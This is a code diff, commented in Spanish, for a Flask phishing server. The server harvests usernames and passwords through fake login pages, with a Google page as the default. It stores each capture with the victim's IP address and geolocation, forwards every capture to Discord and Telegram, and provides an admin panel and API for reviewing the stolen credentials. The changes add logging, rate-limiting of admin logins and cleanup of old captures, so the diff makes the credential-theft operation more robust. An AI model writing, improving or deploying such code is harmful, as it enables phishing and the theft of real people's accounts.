@@ -5,11 +5,17 @@ import json
 import requests
 import hashlib
 import re
-from datetime import datetime
+import logging
+from datetime import datetime, timedelta
 from flask import Flask, request, render_template_string, redirect, jsonify, abort, session
 
+# Configurar logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
 app = Flask(__name__)
-app.secret_key = 'clave-secreta-para-session-12345'
+# Usar variable de entorno para la clave secreta (más seguro)
+app.secret_key = os.environ.get('SECRET_KEY', 'clave-secreta-para-session-12345')
 
 # Config
 CONFIG = {
@@ -19,35 +25,69 @@ CONFIG = {
     'redirect_url': 'https://www.google.com',
     'template': 'google',
     'api_key': 'cambia-esta-clave',
-    'admin_password': 'triple777'
+    'admin_password': 'triple777',
+    'max_login_attempts': 5,  # Límite de intentos de login
+    'cleanup_days': 30  # Días para eliminar credenciales antiguas
 }
+
+# Almacenar intentos de login por IP
+login_attempts = {}
 
 def load_config():
     try:
         with open('config.json', 'r') as f:
             CONFIG.update(json.load(f))
-    except:
-        pass
+            logger.info("Configuración cargada desde config.json")
+    except FileNotFoundError:
+        logger.warning("config.json no encontrado, usando configuración por defecto")
+    except Exception as e:
+        logger.error(f"Error al cargar config.json: {e}")
 
 def init_db():
-    conn = sqlite3.connect('credentials.db', check_same_thread=False)
-    cursor = conn.cursor()
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS credentials (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            timestamp TEXT,
-            ip TEXT,
-            username TEXT,
-            password TEXT,
-            user_agent TEXT,
-            referer TEXT,
-            geo_location TEXT,
-            hash TEXT UNIQUE,
-            viewed INTEGER DEFAULT 0
-        )
-    ''')
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS credentials (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                timestamp TEXT,
+                ip TEXT,
+                username TEXT,
+                password TEXT,
+                user_agent TEXT,
+                referer TEXT,
+                geo_location TEXT,
+                hash TEXT UNIQUE,
+                viewed INTEGER DEFAULT 0
+            )
+        ''')
+        conn.commit()
+        conn.close()
+        logger.info("Base de datos inicializada correctamente")
+    except Exception as e:
+        logger.error(f"Error al inicializar la base de datos: {e}")
+
+def cleanup_old_credentials(days=None):
+    """Elimina credenciales con más de X días"""
+    if days is None:
+        days = CONFIG.get('cleanup_days', 30)
+    
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('''
+            DELETE FROM credentials 
+            WHERE datetime(timestamp) < datetime('now', ?)
+        ''', (f'-{days} days',))
+        deleted = cursor.rowcount
+        conn.commit()
+        conn.close()
+        if deleted > 0:
+            logger.info(f"Eliminadas {deleted} credenciales antiguas (más de {days} días)")
+        return deleted
+    except Exception as e:
+        logger.error(f"Error en cleanup de credenciales: {e}")
+        return 0
 
 def get_client_ip():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -60,8 +100,8 @@ def get_geo(ip):
         r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city", timeout=3).json()
         if r.get('status') == 'success':
             return f"{r.get('city', 'Unknown')}, {r.get('country', 'Unknown')}"
-    except:
-        pass
+    except Exception as e:
+        logger.warning(f"Error al obtener geolocalización para {ip}: {e}")
     return "Unknown"
 
 def is_social_crawler(ua):
@@ -84,16 +124,18 @@ def send_notifications(data):
                 "footer": {"text": f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
             }
             requests.post(CONFIG['discord_webhook'], json={"embeds": [embed]}, timeout=5)
-        except:
-            pass
+            logger.info("Notificación enviada a Discord")
+        except Exception as e:
+            logger.error(f"Error al enviar notificación a Discord: {e}")
     
     if CONFIG.get('telegram_token') and CONFIG.get('telegram_chat'):
         try:
             msg = f"🎯 *Nueva Captura*\n\n📍 `{data['ip']}`\n🌍 `{data['geo']}`\n👤 `{data['username']}`\n🔑 `{data['password'][:30]}`"
             url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendMessage"
             requests.post(url, json={"chat_id": CONFIG['telegram_chat'], "text": msg, "parse_mode": "Markdown"}, timeout=5)
-        except:
-            pass
+            logger.info("Notificación enviada a Telegram")
+        except Exception as e:
+            logger.error(f"Error al enviar notificación a Telegram: {e}")
 
 def get_template(name='google'):
     templates = {
@@ -292,20 +334,56 @@ def capture():
               data['user_agent'], data['referer'], geo, hash_str))
         conn.commit()
         conn.close()
+        logger.info(f"Nueva credencial capturada: {username} desde {ip}")
     except Exception as e:
-        print(f"DB error: {e}")
+        logger.error(f"Error al guardar credencial: {e}")
     
     send_notifications(data)
     return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
 
 @app.route('/login-credenciales', methods=['GET', 'POST'])
 def login_credenciales():
+    ip = get_client_ip()
+    max_attempts = CONFIG.get('max_login_attempts', 5)
+    
+    # Verificar si la IP ha superado el límite de intentos
+    if ip in login_attempts and login_attempts[ip] >= max_attempts:
+        return render_template_string('''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Acceso Bloqueado</title>
+            <style>
+                body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+                .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
+                .error { color: red; margin-top: 10px; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>🚫 Acceso Bloqueado</h1>
+                <p>Has superado el límite de intentos permitidos ({max_attempts}).</p>
+                <p class="error">Espera 5 minutos para volver a intentarlo.</p>
+            </div>
+        </body>
+        </html>
+        ''', 429
+    
     if request.method == 'POST':
         password = request.form.get('password')
         if password == CONFIG.get('admin_password', 'triple777'):
+            # Login exitoso, resetear intentos
+            login_attempts.pop(ip, None)
             session['admin_logged'] = True
+            session.permanent = True  # Sesión persistente
+            logger.info(f"Login exitoso desde IP {ip}")
             return redirect('/ver-credenciales')
         else:
+            # Incrementar intentos fallidos
+            login_attempts[ip] = login_attempts.get(ip, 0) + 1
+            remaining = max_attempts - login_attempts[ip]
+            logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip]}")
+            
             return render_template_string('''
             <!DOCTYPE html>
             <html>
@@ -320,7 +398,7 @@ def login_credenciales():
             <body>
                 <div class="container">
                     <h1>🔒 Contraseña incorrecta</h1>
-                    <p class="error">Inténtalo de nuevo</p>
+                    <p class="error">Intentos restantes: ''' + str(remaining) + '''</p>
                     <a href="/login-credenciales">Volver</a>
                 </div>
             </body>
@@ -365,11 +443,15 @@ def ver_credenciales():
     if not session.get('admin_logged'):
         return redirect('/login-credenciales')
     
-    conn = sqlite3.connect('credentials.db', check_same_thread=False)
-    cursor = conn.cursor()
-    cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
-    rows = cursor.fetchall()
-    conn.close()
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('SELECT id, timestamp, ip, username, password, geo_location FROM credentials ORDER BY id DESC')
+        rows = cursor.fetchall()
+        conn.close()
+    except Exception as e:
+        logger.error(f"Error al leer credenciales: {e}")
+        return "<h1>❌ Error al cargar las credenciales</h1>"
     
     if not rows:
         return "<h1>📭 No hay credenciales capturadas aún</h1>"
@@ -431,21 +513,28 @@ def ver_credenciales():
 @app.route('/logout-credenciales')
 def logout_credenciales():
     session.pop('admin_logged', None)
+    logger.info("Sesión cerrada")
     return redirect('/login-credenciales')
 
 @app.route('/api/credentials')
 def api_credentials():
     key = request.headers.get('X-API-Key')
     if key != CONFIG.get('api_key'):
+        logger.warning(f"Intento de acceso no autorizado a /api/credentials desde {request.remote_addr}")
         abort(401)
     
-    conn = sqlite3.connect('credentials.db', check_same_thread=False)
-    cursor = conn.cursor()
-    cursor.execute('SELECT id, timestamp, ip, username, password, geo_location, viewed FROM credentials ORDER BY id DESC')
-    rows = cursor.fetchall()
-    cursor.execute('UPDATE credentials SET viewed = 1 WHERE viewed = 0')
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('SELECT id, timestamp, ip, username, password, geo_location, viewed FROM credentials ORDER BY id DESC')
+        rows = cursor.fetchall()
+        cursor.execute('UPDATE credentials SET viewed = 1 WHERE viewed = 0')
+        conn.commit()
+        conn.close()
+        logger.info(f"API /credentials consultada exitosamente")
+    except Exception as e:
+        logger.error(f"Error en API /credentials: {e}")
+        return jsonify({'error': 'Error interno'}), 500
     
     return jsonify([{
         'id': r[0], 'timestamp': r[1], 'ip': r[2], 'username': r[3],
@@ -456,23 +545,67 @@ def api_credentials():
 def stats():
     key = request.headers.get('X-API-Key')
     if key != CONFIG.get('api_key'):
+        logger.warning(f"Intento de acceso no autorizado a /api/stats desde {request.remote_addr}")
         abort(401)
     
-    conn = sqlite3.connect('credentials.db', check_same_thread=False)
-    cursor = conn.cursor()
-    cursor.execute('SELECT COUNT(*), COUNT(DISTINCT ip), COUNT(CASE WHEN viewed=0 THEN 1 END) FROM credentials')
-    total, unique, new = cursor.fetchone()
-    conn.close()
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('SELECT COUNT(*), COUNT(DISTINCT ip), COUNT(CASE WHEN viewed=0 THEN 1 END) FROM credentials')
+        total, unique, new = cursor.fetchone()
+        conn.close()
+        logger.info(f"API /stats consultada exitosamente")
+    except Exception as e:
+        logger.error(f"Error en API /stats: {e}")
+        return jsonify({'error': 'Error interno'}), 500
     
     return jsonify({'total': total, 'unique_ips': unique, 'new': new})
 
+@app.route('/api/cleanup', methods=['POST'])
+def api_cleanup():
+    """Endpoint para limpieza manual de credenciales antiguas"""
+    key = request.headers.get('X-API-Key')
+    if key != CONFIG.get('api_key'):
+        abort(401)
+    
+    days = request.args.get('days', CONFIG.get('cleanup_days', 30), type=int)
+    deleted = cleanup_old_credentials(days)
+    return jsonify({
+        'deleted': deleted,
+        'message': f'Eliminadas {deleted} credenciales con más de {days} días',
+        'days': days
+    })
+
 @app.route('/health')
 def health():
-    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})
+    return jsonify({
+        'status': 'ok', 
+        'time': datetime.now().isoformat(),
+        'credentials_count': get_credentials_count()
+    })
+
+def get_credentials_count():
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('SELECT COUNT(*) FROM credentials')
+        count = cursor.fetchone()[0]
+        conn.close()
+        return count
+    except:
+        return 0
 
 if __name__ == '__main__':
     load_config()
     init_db()
+    
+    # Limpiar credenciales antiguas al iniciar
+    cleanup_old_credentials()
+    
     port = int(os.environ.get('PORT', 8080))
-    print(f"[+] Server started on port {port}")
+    logger.info(f"Servidor iniciado en el puerto {port}")
+    logger.info(f"Contraseña de administrador: {CONFIG.get('admin_password', 'triple777')}")
+    logger.info(f"Límite de intentos de login: {CONFIG.get('max_login_attempts', 5)}")
+    logger.info(f"Días para limpieza automática: {CONFIG.get('cleanup_days', 30)}")
+    
     app.run(host='0.0.0.0', port=port, debug=False)
